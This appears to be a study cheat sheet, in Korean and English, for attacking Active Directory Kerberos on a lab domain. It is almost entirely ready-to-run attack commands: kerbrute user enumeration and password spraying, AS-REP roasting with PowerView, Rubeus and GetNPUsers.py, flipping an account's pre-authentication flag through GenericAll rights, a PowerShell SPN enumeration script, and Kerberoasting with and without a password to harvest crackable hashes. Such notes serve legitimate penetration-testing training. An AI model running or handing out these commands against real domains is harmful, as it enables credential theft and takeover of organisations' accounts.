## Enumerating
```bash
kerbrute userenum users.txt --dc dc01.inlanefreight.local -d inlanefreight.local

kerbrute passwordspray users.txt inlanefreight2020 --dc dc01.inlanefreight.local -d inlanefreight.local
```

## AS-REPRoasting
- 사전인증 비활성화 계정은 `Authenticator`를 KDC에 제공할 필요가 없어진다.
- 유저명으로 `AS-REQ`를 요청하면 인증 없이도 `AS-REP`응답을 받게 된다.
- 응답에 포함된 데이터를 통해서 크래킹 시도.

### Windows
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```
```powershell
.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
```

### Linux
```bash
GetNPUsers.py inlanefreight.local/pixis -request

GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
```

#### GenericAll
```powershell
Import-Module .\PowerView.ps1

Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
```

## Kerberoasting
### Windows
```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
    $userEntry = $result.GetDirectoryEntry()
    Write-host "User" 
    Write-Host "===="
    Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
        Write-host ""
    Write-host "SPNs"
    Write-Host "===="     
    foreach($SPN in $userEntry.servicePrincipalName)
    {
        $SPN       
    }
    Write-host ""
    Write-host ""
}
```
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser -SPN

Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
```
```powershell
Import-Module .\PowerView.ps1

Invoke-Kerberoast
```
```powershell
.\Rubeus.exe kerberoast /nowrap /tgtdeleg
```

### Linux
```bash
GetUserSPNs.py inlanefreight.local/pixis -request
```

#### Without Password
- `Pre-auth`가 비활성화 되어 있는 상태.
- 해당 계정에 최소 하나의 SPN이 존재.
- `sname`필드의 값을 `krbtgt`에서 타겟 SPN으로 바꿔치기해서바꿔치기해서 요청하더라도 인증이 비활성화 되어 있어서 KDC는 SPN을 제공해주게 된다.
```powershell
.\Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap
```
